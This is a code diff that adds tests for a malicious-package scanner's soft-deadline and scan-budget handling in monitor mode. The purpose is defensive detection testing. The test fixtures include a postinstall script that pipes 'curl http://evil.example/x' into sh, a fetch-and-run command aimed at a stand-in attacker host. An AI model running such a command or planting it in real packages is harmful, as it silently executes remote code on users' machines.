@@ -277,6 +277,71 @@ async function runScannerBudgetTests() {
     } finally { resetCompleteness(); cleanup(dir); }
   });
 
+  // --- monitor soft deadline (scan-budget.js) ------------------------------------------
+
+  test('BUDGET: budgetStop reports the count first, then a passed deadline, else nothing', () => {
+    const { readBudget, budgetStop } = require('../../src/shared/scan-budget');
+    assert(budgetStop(readBudget({ byteBudget: 10 }), 10) === 'work-budget', 'count reached');
+    assert(budgetStop(readBudget({ deadline: Date.now() - 1 }), 0) === 'deadline', 'deadline passed');
+    assert(budgetStop(readBudget({ byteBudget: 10, deadline: Date.now() - 1 }), 10) === 'work-budget', 'count wins');
+    assert(budgetStop(readBudget({ byteBudget: 10, deadline: Date.now() + 60000 }), 5) === null, 'neither');
+    assert(budgetStop(readBudget({}), 1e12) === null, 'no budget at all');
+  });
+
+  test('BUDGET: a deadline passed during a file stops before the next one, executed file first', () => {
+    const dir = makePkg({ 'z-main.js': 'module.exports = 1;\n', 'a-other.js': 'module.exports = 2;\n' }, { main: 'z-main.js' });
+    try {
+      resetCompleteness();
+      const analyzed = [];
+      const busy = ms => { const end = Date.now() + ms; while (Date.now() < end) { /* spin */ } };
+      analyzeWithDeobfuscation(dir, (content, file) => { analyzed.push(path.basename(file)); busy(120); return []; },
+        { component: 'probeScanner', deadline: Date.now() + 40 });
+      assert(analyzed.join(',') === 'z-main.js', 'only the executed file before the deadline: ' + analyzed.join(','));
+      assert(getIncomplete().some(e => e.component === 'probeScanner' && e.reason === 'deadline'), 'deadline entry: ' + JSON.stringify(getIncomplete()));
+    } finally { resetCompleteness(); cleanup(dir); }
+  });
+
+  await asyncTest('BUDGET: in the monitor a passed soft deadline still gives a verdict, INCONCLUSIVE, with the light scanners', async () => {
+    const dir = makePkg({ 'index.js': PAYLOAD }, { scripts: { postinstall: 'curl http://evil.example/x | sh' } });
+    try {
+      const r = await withEnv('MUADDIB_NO_REGISTRY_FETCH', '1', () =>
+        withEnv('MUADDIB_MONITOR_SOFT_DEADLINE_MS', '0', () => runScanDirect(dir, { monitorMode: true })));
+      assert(r.analysis.status === 'INCONCLUSIVE', 'INCONCLUSIVE expected: ' + JSON.stringify(r.analysis));
+      for (const c of ['analyzeAST', 'analyzeDataFlow', 'moduleGraph']) {
+        assert(reasons(r).includes(c + '/deadline'), `${c}/deadline expected: ` + reasons(r).join(' '));
+      }
+      assert(r.summary.riskScore > 0 && r.threats.some(t => t.type === 'lifecycle_script' || /lifecycle/.test(t.type)),
+        'the package.json scanner still reports: ' + r.threats.map(t => t.type).join(','));
+    } finally { cleanup(dir); }
+  });
+
+  await asyncTest('BUDGET: a monitor scan cut by the deadline alerts on enough partial findings, never becomes clean', async () => {
+    const { softDeadlineDecision } = require('../../src/monitor/queue.js');
+    const monitorScan = (dir, deadline) => withEnv('MUADDIB_NO_REGISTRY_FETCH', '1', () =>
+      withEnv('MUADDIB_MONITOR_SOFT_DEADLINE_MS', deadline, () => runScanDirect(dir, { monitorMode: true })));
+    const quiet = makePkg({ 'index.js': PAYLOAD });
+    const loud = makePkg({ 'index.js': 'module.exports = 1;\n' }, { scripts: { postinstall: 'curl http://evil.example/x | sh' } });
+    try {
+      const q = await monitorScan(quiet, '0');
+      assert(softDeadlineDecision(q) === 'inconclusive',
+        `heavy-scanner payload cut off (score ${q.summary.riskScore}): must stay inconclusive, got ${softDeadlineDecision(q)}`);
+      const l = await monitorScan(loud, '0');
+      assert(softDeadlineDecision(l) === 'alert',
+        `lifecycle shell pipe found by the light scanners (score ${l.summary.riskScore}) must alert, got ${softDeadlineDecision(l)}`);
+      const full = await monitorScan(quiet, '600000');
+      assert(softDeadlineDecision(full) === null, 'a scan that met its deadline takes the normal path');
+    } finally { cleanup(quiet); cleanup(loud); }
+  });
+
+  await asyncTest('BUDGET: outside the monitor the soft deadline does not exist (CLI stays deterministic)', async () => {
+    const dir = makePkg({ 'index.js': PAYLOAD });
+    try {
+      const r = await withEnv('MUADDIB_MONITOR_SOFT_DEADLINE_MS', '0', () => runScanDirect(dir));
+      assert(!reasons(r).some(x => /\/deadline$/.test(x)), 'no deadline outside the monitor: ' + reasons(r).join(' '));
+      assert(r.threats.some(t => t.type === 'suspicious_dataflow' || /exec|dataflow/.test(t.type)), 'heavy scanners ran: ' + r.threats.map(t => t.type).join(','));
+    } finally { cleanup(dir); }
+  });
+
   await asyncTest('BUDGET: MUADDIB_SCANNER_WORK_BUDGET=0 makes the heavy scanners stop and the scan INCONCLUSIVE', async () => {
     const dir = makePkg({ 'index.js': PAYLOAD });
     try {
